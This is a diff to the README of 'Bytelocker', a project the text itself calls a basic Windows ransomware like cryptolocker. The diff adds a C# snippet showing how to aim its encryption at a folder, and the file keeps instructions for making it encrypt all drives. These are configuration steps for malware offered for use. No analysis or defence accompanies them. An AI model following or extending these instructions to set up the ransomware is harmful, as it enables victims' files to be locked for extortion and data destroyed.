@@ -6,7 +6,12 @@ This program is a basic Windows ransomeware similar to cryptolocker which uses A
 
 ### Instructions for making program encrypt a single folder
  * Open `src/Bytelocker.cs` in VS or any other editor/ide.
- * Enter folder to encrypt in the `Encrypt()` method.
+ * Enter folder to encrypt in the appropriate spot in the `Encrypt()` method. eg. 
+ 
+ ```
+ CryptoManagerMainHandler cmh = new CryptoManagerMainHandler();
+ cmh.EncryptFolder(@"c:\temp");
+ ```
  
 ### Instructions for making the program encrypt all drives
   * Open `src/CryptoManager/CryptoManagerMainHandler.cs` in VS or any other editor/ide.
